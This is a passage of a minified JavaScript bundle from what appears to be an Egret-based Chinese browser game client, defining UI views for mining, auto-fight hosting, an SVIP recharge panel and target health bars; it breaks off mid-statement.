win.open("MineInfoWin",t.target.data);switch(t.target){case this.eAdd:var n=r.GlobalConfig.CaiKuangConfig.addItem,s=r.GlobalConfig.ItemConfig[n],a=g.BagCT.ins().getBagGoodsCountById(g.BagCT.BAG_TYPE_OTHTER,n);a>0?win.open("ItemUseTipsWin",{itemConfig:s,configID:s.id,count:a}):m.TipsCT.ins().showTips(gettext("背包内没有{0}",s.name));break;case this.eBtn:o.Mine.ins().sendExit();break;case this.closeBtn:win.close(this)}},e.prototype.update=function(){this.updatePower(),this.updateList(),this.updateGrp(),this.updatePosList(),this.updateLog(),this.updateItem()},e.prototype.updateInfo=function(){this.updatePower(),this.updateItem()},e.prototype.updateItem=function(){this.itemDP.source=o.Mine.ins().rewards},e.prototype.updateLog=function(){for(var t=o.Mine.ins().logs,e="",i=t.length-1;i>=0;i--)e+=""+(e?"\n":"")+t[i];e&&(this.eLog.textFlow=s.TextFlowMaker.generateTextFlow(e)),this.eLog.validateNow(),this.eLogGrp.validateNow(),this.eLogGrp.contentHeight>this.eLogGrp.height&&(this.eLogGrp.scrollV=this.eLogGrp.contentHeight-this.eLogGrp.height)},e.prototype.updateGrp=function(){this.updateList(),this.eEnterGrp.visible=0==o.Mine.ins().areaId,this.eGrp.visible=!this.eEnterGrp.visible,o.Mine.ins().areaId>0&&this.updatePosList()},e.prototype.updateList=function(){this.listDP.refresh()},e.prototype.updatePosList=function(){o.Mine.ins().areaId<=0||(this.lastAreaId!=o.Mine.ins().areaId?this.posDP.source=h.CommonUtils.objectToArrayShallow(o.Mine.ins().areaInfos[o.Mine.ins().areaId]):this.posDP.replaceAll(h.CommonUtils.objectToArrayShallow(o.Mine.ins().areaInfos[o.Mine.ins().areaId])),this.lastAreaId=o.Mine.ins().areaId)},e.prototype.updatePower=function(){var t=o.Mine.ins().power;this.eWorker.textFlow=s.TextFlowMaker.generateTextFlow(gettext("矿工体力：|C:{0}&T:{1}/{2}|",t>0?a.ColorUtil.GREEN:a.ColorUtil.RED,t,r.GlobalConfig.CaiKuangConfig.vitMax))},e.prototype.updateMyPos=function(t){t&&t.actorId==f.ActorCC.actorID&&(this.myStartTime=t.start)},e.prototype.updateBar=function(){if(this.eBar.visible=!!o.Mine.ins().posId,o.Mine.ins().posId){var t=(d.GameServerCC.serverTime-this.myStartTime)/c.DateUtils.MS_PER_SECOND%this.eBar.maximum;this.eBar.value=t}},e.prototype.updateExit=function(){this.eBtn.visible=!!o.Mine.ins().posId},e.prototype.enterFrame=function(){this.updatePower(),this.updateBar(),this.updateExit()},__decorate([delayCall(1e3)],e.prototype,"enterFrame",null),e}(n.BaseView);e.MineMainWin=v,window.MineMainWin=v,__reflect(v.prototype,"MineMainWin",[]),window.MineMainWin=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MineEnterRenderer=void 0;var n=i(3),o=i(174),s=i(42),a=i(18),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="wakuangitemRenderskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!1,this.touchChildren=!0,this.eIcon.visible=!1,this.nameColor=this.eName.textColor,this.btnColor=this.eBtn.textColor},e.prototype.dataChanged=function(){var t=o.Mine.ins().areaId;if(!this.data){this.eName.textColor=this.nameColor,this.eName.text=gettext("矿区入口"),this.txtCapture.text="";var e=0==t;return this.eIcon.visible=e,this.eBtn.textFlow=(new egret.HtmlTextParser).parse(s.StringUtils.addColor(e?gettext("当前所在"):gettext("<u>回到出口</u>"),e?a.ColorUtil.GREEN:this.btnColor)),void(this.eBtn.touchEnabled=!0)}var i=this.data;this.eName.textColor=+i.color,this.txtCapture.textColor=+i.color;var n=o.Mine.ins().getMyMineArea();this.eName.text=""+i.areaName,this.txtCapture.text=n==i.area?""+gettext("占领中"):"";var r=t==i.area;this.eIcon.visible=r,this.eBtn.textFlow=(new egret.HtmlTextParser).parse(s.StringUtils.addColor(r?gettext("当前所在"):gettext("<u>前往</u>"),r?a.ColorUtil.GREEN:this.btnColor)),this.eBtn.touchEnabled=!0},e.prototype.getAreaId=function(){return this.data?this.data.area:0},e}(n.BaseItemRender);e.MineEnterRenderer=r,window.MineEnterRenderer=r,__reflect(r.prototype,"MineEnterRenderer",[]),window.MineEnterRenderer=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MinePosRenderer=void 0;var n=i(3),o=i(174),s=i(4),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="wakuangposrenderskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!0,this.touchChildren=!1},e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.eBg.source="Wakuang_pz"+t.areaId,this.eId.text=t.posId+"",this.eId.textColor=this.eTips.textColor=+o.Mine.ins().getCfgByAreaId(t.areaId).color,t.actorId==s.ActorCC.actorID&&(this.eTips.textColor=16768159),this.eTips.text=t.actorId?t.name:gettext("可占领")}},e}(n.BaseItemRender);e.MinePosRenderer=a,window.MinePosRenderer=a,__reflect(a.prototype,"MinePosRenderer",[]),window.MinePosRenderer=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MineItemRenderer=void 0;var n=i(3),o=i(0),s=i(30),a=i(10),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="wakuangitemskin",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data;if(this.eNumLab.text="X"+t.count,0==t.type)this.eIcon.source=s.RewardData.getCurrencyRes(t.id),this.eName.text=s.RewardData.getCurrencyName(t.id);else{var e=o.GlobalConfig.ItemConfig[t.id];this.eIcon.source=a.ItemUtil.getItemSource(e),this.eName.text=e.name}}},e}(n.BaseItemRender);e.MineItemRenderer=r,window.MineItemRenderer=r,__reflect(r.prototype,"MineItemRenderer",[]),window.MineItemRenderer=r},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AutoFightInfoWin=void 0;var n=i(18),o=i(5),s=i(1),a=i(11),r=i(0),l=i(6),h=i(10),u=i(45),p=i(27),d=i(114),c=i(511),f=i(169),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="AutoFightInfoSkin",e.equipLen=[0,0],e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstInfo.itemRenderer=c.AutoFightInfoItemRender,this.lstInfo.dataProvider=u.ChatCT.ins().systemListKoData,this.lstReward.itemRenderer=a.ItemBase,this.lstEquip.itemRenderer=a.ItemBase,this.addTouchEvent(this.btnStopAuto,this.onClick),this.addTouchEvent(this.classBtn,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.showInfo(),this.showItem(),this.showEquip(),Timer.start(1e3,-1,this.timeFun,this),observe(this,this.updateView,f.RexueDideCT.ins().postAutomatichostingInfo),observe(this,this.updateItem,f.RexueDideCT.ins().postAutomatiItemInfo),observe(this,this.onClose,f.RexueDideCT.ins().postStopAutomatichosting),this.lstInfo.dataProvider.addEventListener(eui.CollectionEvent.COLLECTION_CHANGE,this.refushBarList,this),d.KFBossSys.ins().sendBossInfo()},e.prototype.showInfo=function(){var t="",e="",i=f.RexueDideCT.ins().infos,s=r.GlobalConfig.AutoFightInfoConfig;for(var a in s){var u=s[a],p=i[parseInt(a)-1],d=p?p.value:0,c=h.ItemUtil.getQualityColor(u.color);1==u.type?t+="|C:"+c+"&T:"+u.name+": "+d+"|\n":e+="|C:"+c+"&T:"+u.name+": "+d+"|\n"}this.leftInfo.textFlow=o.TextFlowMaker.generateTextFlow(t),this.rightInfo.textFlow=o.TextFlowMaker.generateTextFlow(e);var g=l.BagCT.ins().getMaxBagRoom(),m=l.BagCT.ins().getAllSurplusCount(5);0>m&&(m=0);var v=5>m?n.ColorUtil.RED_COLOR_N:n.ColorUtil.GREEN_COLOR_N,y=gettext("当前背包剩余格子数|C:{0}&T:{1}|/{2}",v,m,g);this.lastCell.textFlow=o.TextFlowMaker.generateTextFlow(y)},e.prototype.showItem=function(){this.equipLen[1]!=f.RexueDideCT.ins().items.length&&this.updateItem()},e.prototype.updateItem=function(){this.lstReward.dataProvider=new eui.ArrayCollection(f.RexueDideCT.ins().items),this.equipLen[1]=f.RexueDideCT.ins().items.length},e.prototype.showEquip=function(){this.equipLen[0]!=f.RexueDideCT.ins().equips.length&&(this.lstEquip.dataProvider=new eui.ArrayCollection(f.RexueDideCT.ins().equips),this.equipLen[0]=f.RexueDideCT.ins().equips.length)},e.prototype.timeFun=function(){this.autoTime.text=gettext("托管时间：")+f.RexueDideCT.ins().AutoOverTimeStr},e.prototype.updateView=function(){this.showInfo(),this.showItem(),this.showEquip()},e.prototype.onClick=function(t){var e=this;switch(t.currentTarget){case this.btnStopAuto:p.WarnWin.show(gettext("是否确认结束本次托管"),function(){Timer.has(e.timeFun,e)&&Timer.stop(e.timeFun,e),f.RexueDideCT.ins().stopAutoBoss(),f.RexueDideCT.ins().sendStopAutomatichosting()},this);break;case this.classBtn:win.close(this)}},e.prototype.onClose=function(){win.close(this)},e.prototype.refushBarList=function(){this.scInfo.viewport.validateNow(),this.scInfo.viewport.contentHeight>this.scInfo.height&&(this.scInfo.viewport.scrollV=this.scInfo.viewport.contentHeight-this.scInfo.height),this.scEquip.viewport.validateNow(),this.scEquip.viewport.contentHeight>this.scEquip.height&&(this.scEquip.viewport.scrollV=this.scEquip.viewport.contentHeight-this.scEquip.height),this.scReward.viewport.validateNow(),this.scReward.viewport.contentHeight>this.scReward.height&&(this.scReward.viewport.scrollV=this.scReward.viewport.contentHeight-this.scReward.height)},e.prototype.removeDisplay=function(){Timer.stopAll(this),this.removeDataProviderEvent(),this.lstInfo&&(this.lstInfo.dataProvider=null),this.lstReward&&(this.lstReward.dataProvider=null),this.lstEquip&&(this.lstEquip.dataProvider=null)},e.prototype.removeDataProviderEvent=function(){this.lstInfo.dataProvider&&this.lstInfo.dataProvider.removeEventListener(eui.CollectionEvent.COLLECTION_CHANGE,this.refushBarList,this)},__decorate([delayCall(100)],e.prototype,"refushBarList",null),e}(s.BaseView);e.AutoFightInfoWin=g,window.AutoFightInfoWin=g,__reflect(g.prototype,"AutoFightInfoWin",[]),window.AutoFightInfoWin=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AutoFightWin=void 0;var n=i(18),o=i(5),s=i(1),a=i(0),r=i(15),l=i(20),h=i(43),u=i(32),p=i(64),d=i(12),c=i(25),f=i(2),g=i(114),m=i(512),v=i(169),y=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="AutoFightSkin",e.sData=new eui.ArrayCollection,e.eData=new eui.ArrayCollection,e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstBoss.itemRenderer=m.AutoFightBossItemRender,this.lstBoss.dataProvider=this.sData,observe(this,this.updateList,h.CityCC.ins().postMapBossList),observe(this,this.openAutoFight,v.RexueDideCT.ins().postAutomatichosting),observe(this,this.updateList,v.RexueDideCT.ins().postSelectAllBoss),observe(this,this.updataBtn,v.RexueDideCT.ins().postChangeBossArr),observe(this,this.updateList,v.RexueDideCT.ins().onAutomatiChallangeCont),this.addTouchEvent(this.btnAuto,this.onClick),this.addTouchEvent(this.btnAll,this.onClick),this.addTouchEvent(this.closeBtn,this.onClick),this.addTouchEvent(this.autoSet,this.onClick),this.addTouchEvent(this.btnHelp,this.onClick),this.addChangeEvent(this.eTab,this.onTabTouch),this.addChangingEvent(this.eTab,this.onTabTouching)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.eTab.selectedIndex=0,v.RexueDideCT.ins().autoTabSelectIndex=this.eTab.selectedIndex,this.updateList(),this.autoSet.textFlow=o.TextFlowMaker.generateTextFlow(gettext("|U&C:{0}&T:挂机设置|",n.ColorUtil.GREEN_COLOR_N)),g.KFBossSys.ins().sendBossInfo()},e.prototype.updataView=function(){this.updateList()},e.prototype.onTabTouching=function(t){if(2==this.eTab.selectedIndex){var e=d.OpenSystem.ins().checkSysOpen(r.SystemType.WoLongShanZhuang);e||(f.TipsCT.ins().showTips(d.OpenSystem.ins().getNoOpenTips(r.SystemType.WoLongShanZhuang)),t.preventDefault())}if(3==this.eTab.selectedIndex){var e=d.OpenSystem.ins().checkSysOpen(r.SystemType.MaYaShenDian);e||(f.TipsCT.ins().showTips(d.OpenSystem.ins().getNoOpenTips(r.SystemType.MaYaShenDian)),t.preventDefault())}},e.prototype.onTabTouch=function(t){v.RexueDideCT.ins().autoTabSelectIndex=this.eTab.selectedIndex,this.updateList(),this.lstBoss.scrollV=0},e.prototype.updateList=function(){var t=this.eTab.selectedIndex,e=v.RexueDideCT.ins().challangeCount,i=h.CityCC.ins().CITI_FB_BOSS_TYPE[t],n=[];if(n=3==t?p.MainUICC.getKFBossList():p.MainUICC.getMapBossList(i),this.sData.replaceAll(n),this.updataBtn(),t-1>=0){var o=a.GlobalConfig.GuajiBaseConfig.autoCount;this.lefttimes.text=gettext("剩余自动挑战次数:{0}/{1}",e[t-1],o[t-1]),this.lefttimes.textColor=e[t-1]<=0?16711680:2149168,this.lefttimes.visible=!0}else this.lefttimes.visible=!1;var s=d.OpenSystem.ins().checkSysOpen(r.SystemType.AUTO_FIGHT_BUY);if(!s&&0!=this.eTab.selectedIndex){a.GlobalConfig.OpenSystemConfig[r.SystemType.AUTO_FIGHT_BUY]}},e.prototype.openAutoFight=function(){win.close(this)},e.prototype.removeDisplay=function(){},e.prototype.onClick=function(t){var e;switch(t.currentTarget){case this.btnAuto:var i=c.Recharge.ins().AutoPrivilegeTime;l.GameMap.fbType!=u.FbCT.FB_TYPE_GUANQIABOSS?f.TipsCT.ins().showTips(gettext("当前场景无法进行托管")):i?v.RexueDideCT.ins().sendAutomatichosting(this.autoBuyHp.selected?1:0,this.autoBuyMagic.selected?1:0):win.open("AutoPrivilegeWin");break;case this.btnAll:var n=v.RexueDideCT.ins().autoTabSelectIndex,o=c.Recharge.ins().AutoPrivilegeTime;if(0==n){if(0==o)return void f.TipsCT.ins().showTips(gettext("开通托管特权可勾选"))}else if(-2!=o)return void f.TipsCT.ins().showTips(gettext("开通高级托管特权可勾选"));v.RexueDideCT.ins().selectAllBoos();break;case this.closeBtn:win.close(this);break;case this.autoSet:win.open("SettingView");break;case this.btnHelp:win.open("CommonHelpWin",(null===(e=a.GlobalConfig.HelpInfoConfig[6])||void 0===e?void 0:e.text)||"")}},e.prototype.updataBtn=function(){v.RexueDideCT.ins().isSelectAll()?this.btnAll.label=gettext("一键解除"):this.btnAll.label=gettext("一键勾选");var t=v.RexueDideCT.ins().getAllBossLen(),e=p.MainUICC.getMapAllBossList().length+p.MainUICC.getKFBossList().length;this.selected.textFlow=o.TextFlowMaker.generateTextFlow(gettext("已选择: |C:{0}&T:{1}/{2}|",n.ColorUtil.GREEN_COLOR_N,t,e))},e}(s.BaseView);e.AutoFightWin=y,window.AutoFightWin=y,__reflect(y.prototype,"AutoFightWin",[]),window.AutoFightWin=y},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShowImgView=void 0;var n=i(1),o=i(103),s=i(460),a=function(t){function e(){var e=t.call(this)||this;return e.defaultRect=!1,e.list=[],e.touchChildren=!1,e.touchEnabled=!1,e}return __extends(e,t),e.prototype.showMoveImg=function(t){return __awaiter(this,void 0,void 0,function(){var e,i,n,s,a,r,l,h;return __generator(this,function(u){switch(u.label){case 0:e=0,u.label=1;case 1:return e<t[2]?(i=new eui.Image,n=o.StageUtils.ins().getWidth()/2-20,s=o.StageUtils.ins().getHeight()/2-35,i.x=n,i.y=s,i.scaleX=i.scaleY=.6,i.source=t[0],i.alpha=0,this.addChild(i),this.list.unshift(i),i.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeTipsItem,this),egret.Tween.removeTweens(i),a=100-250*Math.random()+n,r=50-150*Math.random()+s,l=300*Math.random(),h=egret.Tween.get(i),h.wait(l).to({x:a,y:r,alpha:1},200).wait(300),[4,this.playMove(i,a,r,t[1],t[3],l+300)]):[3,4];case 2:u.sent(),u.label=3;case 3:return e++,[3,1];case 4:return[2]}})})},e.prototype.playMove=function(t,e,i,n,o,a){var r=this,l=s.Bezier.pop({x:e,y:i},{x:n.x,y:n.y});l.display=t,l.ease=egret.Ease.circInOut,l.centerPoint={x:e+o,y:i-100},l.start(1300,function(){s.Bezier.push(l),r.removeChild(t)},this,a)},e.prototype.showImg=function(){for(var t=this,e=function(e){var n=new eui.Image,s=o.StageUtils.ins().getHeight()/2-35;n.horizontalCenter=0,n.y=s,n.scaleX=n.scaleY=.6,n.source=i.img,n.alpha=0,i.addChild(n),i.list.unshift(n),n.addEventListener(egret.Event.REMOVED_FROM_STAGE,i.removeTipsItem,i),egret.Tween.removeTweens(n);var a=egret.Tween.get(n);a.wait(300*Math.random()).to({horizontalCenter:50-130*Math.random(),y:50-100*Math.random()+s,alpha:1},200).wait(300).to(i.targetPos,1e3,egret.Ease.circInOut).to({alpha:0},100).call(function(){t.removeChild(n)})},i=this,n=0;7>n;n++)e(n)},e.prototype.removeTipsItem=function(t){var e=t.currentTarget;e.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeTipsItem,this),e.left=0/0,e.bottom=0/0;var i=this.list.indexOf(e);this.list.splice(i,1),ObjectPool.push(e)},e}(n.BaseView);e.ShowImgView=a,window.ShowImgView=a,__reflect(a.prototype,"ShowImgView",[]),window.ShowImgView=a},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SVipPanel=void 0;var n=i(24),o=i(1),s=i(11),a=i(0),r=i(15),l=i(12),h=i(25),u=i(2),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="SuperVIPSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=s.ItemBase,this.list.dataProvider=this.listArr=new eui.ArrayCollection;var t=h.Recharge.ins().getSvipTodayRechargeAmount()||0,e=h.Recharge.ins().getSvipTotalRechargeAmount();t&&e?(this.lb_ChongZhiTitle1.text=gettext("方法1：单日充值{0}元宝",t),this.lb_ChongZhiTitle2.text=gettext("方法2：历史累计充值{0}元宝",e)):t?(this.lb_ChongZhiTitle1.text=gettext("单日充值{0}元宝",t),this.lb_ChongZhiTitle2.text=""):e?(this.lb_ChongZhiTitle1.text="",this.lb_ChongZhiTitle2.text=gettext("历史累计充值{0}元宝",e)):(this.lb_ChongZhiTitle1.text="",this.lb_ChongZhiTitle2.text="")},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEndEvent(this.btnAct,this.onClick),this.addTouchEndEvent(this.btnCopy,this.onClick),observe(this,this.updateView,h.Recharge.ins().onNewSvipInfo),this.updateView(),this.updateList()},e.prototype.updateView=function(){this.currentState=h.Recharge.ins().isSvipActed?"act":"none",this.validateNow();var t=h.Recharge.ins().getSvipTodayRechargeAmount()||0,e=h.Recharge.ins().getSvipTotalRechargeAmount();t?this.lbTodayProgress.text=h.Recharge.ins().todayRechargeAmount+"/"+t:this.lbTodayProgress.text="",e?this.lbTotalProgress.text=h.Recharge.ins().totalRechargeAmount+"/"+e:this.lbTotalProgress.text="",this.btnAct.labelDisplay.text=h.Recharge.ins().isCanActive()?gettext("立即激活"):gettext("前往充值"),this.btnAct.eRp.visible=h.Recharge.ins().rpSvip.v;var i=urlParam.apptype,n=a.GlobalConfig.SvipControlConfig[i+""]?a.GlobalConfig.SvipControlConfig[i+""]:null;n&&h.Recharge.ins().isSvipActed&&(this.contact.text=n.contact),n&&(this.Head.source=n.Head);var o=a.GlobalConfig.ChongZhiBaseConfig;if(o&&(null===o||void 0===o?void 0:o.svipRelink)){var s=null===o||void 0===o?void 0:o.svipRelink;if(s&&s[urlParam.appid]&&this.urlGrop&&h.Recharge.ins().isSvipActed){this.btnCopy.visible=this.btnAct.visible=!1,this.urlGrop.visible=!0;var r=Object.keys(s[urlParam.appid]);this.Discord.label=r[0],this.Line.label=r[1],this.addTouchEndEvent(this.Discord,this.onClick),this.addTouchEndEvent(this.Line,this.onClick)}}},e.prototype.updateList=function(){this.listArr.replaceAll(a.GlobalConfig.ChongZhiBaseConfig.newsvipRewards)},e.prototype.onClick=function(t){switch(t.target){case this.btnAct:if(h.Recharge.ins().isCanActive())h.Recharge.ins().sendActiveNewSvip();else{var e=win.get("RechargeShowWin");e&&e.eVs&&(e.eVs.selectedIndex=0)}break;case this.btnCopy:var i=this.contact.text;n.CommonUtils.copyResult(i),u.TipsCT.ins().showTips(gettext("已复制客服QQ号"));break;case this.Discord:var o=a.GlobalConfig.ChongZhiBaseConfig;if(o&&(null===o||void 0===o?void 0:o.svipRelink)){var s=null===o||void 0===o?void 0:o.svipRelink;if(s[urlParam.appid]){var r=s[urlParam.appid][this.Discord.label];platform.joinWeb(r)}}break;case this.Line:var l=a.GlobalConfig.ChongZhiBaseConfig;if(l&&(null===l||void 0===l?void 0:l.svipRelink)){var s=null===l||void 0===l?void 0:l.svipRelink;if(s[urlParam.appid]){var r=s[urlParam.appid][this.Line.label];platform.joinWeb(r)}}}},e.prototype.tabRp=function(){return h.Recharge.ins().rpSvip.v},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=l.OpenSystem.ins().checkSysOpen(r.SystemType.SVip);return i||u.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(r.SystemType.SVip)),i},e}(o.BaseView);e.SVipPanel=p,window.SVipPanel=p,__reflect(p.prototype,"SVipPanel",[]),window.SVipPanel=p},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TargetPlayerBigBloodPanel=void 0;var n=i(1),o=i(154),s=i(23),a=i(37),r=i(34),l=i(5),h=i(0),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TargetPlayerSmallBloodSkin",e.curValue=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.bloodBar.slideDuration=0,e.GRAYIMG_WIDTH=this.grayImg.width,this.bloodBar.labelDisplay.visible=!1,this.playerBloodGroup.top=o.BattleCC.ins().isBattle()?this.playerBloodGroup.top:60},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateTarget,s.GameLogic.ins().postChangeTarget),this.updateTarget(),Timer.has(this.changeHp,this)||Timer.start(500,0,this.changeHp,this)},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.grayImg&&egret.Tween.removeTweens(this.grayImg),this.currAttackHandle=0,Timer.has(this.changeHp,this)&&Timer.stop(this.changeHp,this)},e.prototype.changeHp=function(){if(0!=this.currAttackHandle){var t=a.EntityManager.ins().getEntitysBymasterhHandle(this.currAttackHandle,EntityType.Role);if(t&&t.length>0){for(var e=t.length,i=0,n=0,s=0,l=0,h=0;e>h;h++){var u=t[h];if(u){var p=u.infoModel.getAtt(r.AttributeType.atHp)||0,d=u.infoModel.getAtt(r.AttributeType.atMaxHp)||0;i+=p,n+=d;var c=u.infoModel.getAtt(r.AttributeType.cruNeiGong)||0,f=u.infoModel.getAtt(r.AttributeType.maxNeiGong)||0;s+=c,l+=f}}o.BattleCC.ins().isBattle()&&(i=i/n*100,n=100),this.hudunbloodBar0.maximum=l,this.hudunbloodBar0.value=s,this.bloodBar.maximum=n,this.bloodBar.value=i,this.curValue=Math.floor(i/n*100),this.tweenBlood()}else{var g=a.EntityManager.ins().getEntityByHandle(this.currAttackHandle);g&&g.infoModel&&g.infoModel.type==EntityType.Monster&&(this.hudunbloodBar0.maximum=g.infoModel.getAtt(r.AttributeType.maxNeiGong)||0,this.hudunbloodBar0.value=g.infoModel.getAtt(r.AttributeType.cruNeiGong)||0,this.bloodBar.maximum=g.infoModel.getAtt(r.AttributeType.atMaxHp)||0,this.bloodBar.value=g.infoModel.getAtt(r.AttributeType.atHp)||0,this.curValue=Math.floor(this.bloodBar.value/this.bloodBar.maximum*100),this.tweenBlood())}}},e.prototype.updateTarget=function(){if(0==s.GameLogic.ins().currAttackHandle&&win.close(this),0!=this.currAttackHandle&&this.currAttackHandle!=s.GameLogic.ins().currAttackHandle&&(this.currAttackHandle=s.GameLogic.ins().currAttackHandle,0!=this.currAttackHandle)){var t=a.EntityManager.ins().getEntitysBymasterhHandle(this.currAttackHandle,EntityType.Role);if(t&&t.length>0){var e=t[0].infoModel,i=e.name,n=i.split("\n");i=n[1]?n[1]:n[0],this.nameTxt.textFlow=l.TextFlowMaker.generateTextFlow(i),this.head.source="yuanhead"+e.job+e.sex,this.changeHp()}else{var o=a.EntityManager.ins().getEntityByHandle(this.currAttackHandle);if(o&&o.infoModel&&o.infoModel.type==EntityType.Monster){var r=h.GlobalConfig.MonstersConfig[o.infoModel.configID];this.nameTxt.textFlow=(new egret.HtmlTextParser).parser(r.name),this.head.source="monhead"+r.head+"_png",this.changeHp()}}}},e.prototype.tweenBlood=function(){var t=this,i=this.curValue*e.GRAYIMG_WIDTH/100;if(egret.Tween.removeTweens(this.grayImg),!(3>i)){var n=egret.Tween.get(this.grayImg);n.to({width:i-3},1e3).call(function(){0>=i&&(t.grayImg.width=0,egret.Tween.removeTweens(t.grayImg),win.close(t))},this)}},e.GRAYIMG_WIDTH=0,__decorate([delayCall()],e.prototype,"changeHp",null),__decorate([delayCall()],e.prototype,"updateTarget",null),e}(n.BaseView);e.TargetPlayerBigBloodPanel=u,window.TargetPlayerBigBloodPanel=u,__reflect(u.prototype,"TargetPlayerBigBloodPanel",[]),Systemap.TargetPlayerBigBloodPanel=function(){return window.TargetPlayerBigBloodPanel=u}},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TargetBloodPanel=void 0;var n=i(5),o=i(1),s=i(0),a=i(4),r=i(259),l=i(37),h=i(53),u=i(20),p=i(32),d=i(24),c=i(105),f=i(43),g=i(28),m=i(75),v=i(35),y=i(162),C=i(82),T=i(83),b=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="BossBloodSkin",e.teamList=[],e.defaultRect=!1,e._qiyuBossHpNum=0,e.curValue=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.visible=!1,this.eBloodBar.slideDuration=0,e.GRAYIMG_WIDTH=this.eGrayImg.width},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onClick),observe(this,this.targetChange,r.TargetPanelCC.postTarget),observe(this,this.updateBloodBar,r.TargetPanelCC.postBlood),observe(this,this.updateBelong,r.TargetPanelCC.postBelong),observe(this,this.updateBelong,y.BossCT.ins().postBelongChange),observe(this,this.updateCamp,c.CampCC.selectMode,Ts.enterScene.enterOK),observe(this,this.updateList2,f.CityCC.ins().doPostTeamItemInfo),observe(this,this.updateList2,f.CityCC.ins().doTeamChange),this.observe(v.TaskCT.ins().postQiyuBossSyncInfo,this.flusQiyuBossHpInfo),this.update(),this._qiyuBossHpNum=0,this.flusQiyuBossHpInfo()},e.prototype.flusQiyuBossHpInfo=function(){var t;if(this.skin)if(u.GameMap.checkIsInQiyuBoss()){this.txtQiyuBossHpNum.visible=this.txtQiyuBossHurt.visible=!0;var e=v.TaskCT.ins().qiyuBossInfo;if(!e)return;0==this._qiyuBossHpNum&&(this._qiyuBossHpNum=(null===(t=s.GlobalConfig.AdventureBossConfig[e.qiyuBossCfgId])||void 0===t?void 0:t.hpCount)||0);var i=v.TaskCT.ins().qiyuBossSyncInfo;if(!i)return;this.txtQiyuBossHurt.text=gettext("本场累计伤害值：{0}",i.hurtedCnt),this.txtQiyuBossHpNum.text="x"+i.hpCnt}else this.txtQiyuBossHpNum.visible=this.txtQiyuBossHurt.visible=!1},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.skin&&egret.Tween.removeTweens(this.eGrayImg)},e.prototype.onClick=function(t){switch(t.target){case this.eBelongBtn:var e=l.EntityManager.ins().getEntityBymasterhHandle(r.TargetPanelCC.belongHandle);if(!e||e.infoModel.isMy)return;h.ControlCC.setCurTar(e),h.ControlCC.atkAndKill();break;case this.efightbtn:var i=l.EntityManager.ins().getEntityBymasterhHandle(r.TargetPanelCC.belongHandle);if(!i||i.infoModel.isMy)return;h.ControlCC.setCurTar(i),h.ControlCC.atkAndKill()}},e.prototype.update=function(){r.TargetPanelCC.monsterID&&(this.updateBloodBar(),this.updateBaseInfo(),this.updateBelong(),this.teamList=f.CityCC.ins().teamNumberSList)},e.prototype.targetChange=function(){return r.TargetPanelCC.monsterID?(this.visible=r.TargetPanelCC.checkIsShow(l.EntityManager.ins().getEntityByHandle(r.TargetPanelCC.targetHandle)),void 